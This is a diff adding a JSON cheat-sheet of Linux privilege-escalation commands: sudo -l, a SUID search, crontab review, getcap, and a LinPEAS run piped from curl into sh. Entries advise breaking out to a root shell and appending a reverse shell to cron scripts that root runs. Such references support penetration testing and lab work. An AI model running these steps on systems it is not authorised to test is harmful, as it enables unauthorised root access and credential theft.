@@ -1,0 +1,73 @@
+[
+  {
+    "id": "linux-sudo-l",
+    "tool": "sudo",
+    "category": "Linux Privilege Escalation",
+    "scenario_tags": ["linux", "privesc", "enumeration", "sudo"],
+    "platform": "linux",
+    "title": "Check Sudo Permissions",
+    "command": "sudo -l",
+    "description": "Lists the commands that the current user is permitted to run with elevated privileges (usually as root) via the sudo command.",
+    "when_to_use": "This should be the very first command you type upon gaining a low-privilege shell on a Linux box. If the user can run commands like 'vim', 'awk', or 'nmap' via sudo without a password, you can often break out into a root shell immediately.",
+    "example": "sudo -l",
+    "common_pitfalls": "Often prompts for the user's password. If you don't have the user's password, this check might fail unless the administrator explicitly configured NOPASSWD.",
+    "further_reading": [
+      {
+        "label": "GTFOBins - Sudo break-outs",
+        "url": "https://gtfobins.github.io/"
+      }
+    ]
+  },
+  {
+    "id": "linux-suid-search",
+    "tool": "find",
+    "category": "Linux Privilege Escalation",
+    "scenario_tags": ["linux", "privesc", "enumeration", "suid"],
+    "platform": "linux",
+    "title": "Search for SUID Binaries",
+    "command": "find / -perm -u=s -type f 2>/dev/null",
+    "description": "Searches the entire file system for executable files that have the Set-User-ID (SUID) bit set. When executed, these files run with the privileges of the file's owner (often root) rather than the user executing them.",
+    "when_to_use": "A fundamental manual check. If you find a non-standard binary (e.g., an outdated version of 'exim4' or a custom backup script) with the SUID bit set, it is a prime target for exploitation.",
+    "example": "find / -perm -u=s -type f 2>/dev/null",
+    "common_pitfalls": "This will return many false positives (like /usr/bin/passwd or /bin/su) which naturally require the SUID bit to function properly. You must filter these out mentally."
+  },
+  {
+    "id": "linux-cron-jobs",
+    "tool": "cat",
+    "category": "Linux Privilege Escalation",
+    "scenario_tags": ["linux", "privesc", "enumeration", "cron"],
+    "platform": "linux",
+    "title": "View System Cron Jobs",
+    "command": "cat /etc/crontab\nls -la /etc/cron.d/",
+    "description": "Reads the system-wide crontab file and lists the contents of the cron.d directory to reveal scheduled tasks running automatically.",
+    "when_to_use": "Look for scheduled tasks running as root that call scripts with weak permissions. If you can edit a script that root is scheduled to run every 5 minutes, you can simply append a reverse shell payload to it.",
+    "example": "cat /etc/crontab"
+  },
+  {
+    "id": "linux-capabilities",
+    "tool": "getcap",
+    "category": "Linux Privilege Escalation",
+    "scenario_tags": ["linux", "privesc", "enumeration", "capabilities"],
+    "platform": "linux",
+    "title": "Search for File Capabilities",
+    "command": "getcap -r / 2>/dev/null",
+    "description": "Recursively searches the filesystem for binaries that have been assigned specific Linux capabilities (a modern alternative to the monolithic SUID bit).",
+    "when_to_use": "Crucial for finding stealthy privilege escalation vectors. For example, if the 'tar' or 'python' binary has the 'cap_dac_read_search' capability, you can use it to read any file on the system, including /etc/shadow, without needing full root.",
+    "example": "getcap -r / 2>/dev/null",
+    "common_pitfalls": "Often overlooked by beginners who only focus on SUID files. Capabilities are widely used in containerized environments (like Docker)."
+  },
+  {
+    "id": "linpeas-all",
+    "tool": "LinPEAS",
+    "category": "Linux Privilege Escalation",
+    "scenario_tags": ["linux", "privesc", "automation"],
+    "platform": "linux",
+    "title": "Run Full LinPEAS Scan",
+    "command": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "description": "Downloads and executes the Linux Privilege Escalation Awesome Script. It color-codes the output to highlight the most probable paths to root.",
+    "when_to_use": "The gold standard for automated enumeration. Run this to check for vulnerable kernel versions, misconfigured NFS shares, plaintext passwords in config files, and much more.",
+    "example": "curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh",
+    "common_pitfalls": "Executing scripts directly from the internet via 'curl | sh' is extremely loud and easily blocked or flagged by enterprise EDR solutions.",
+    "related_ids": ["win-winpeas-all"]
+  }
+]
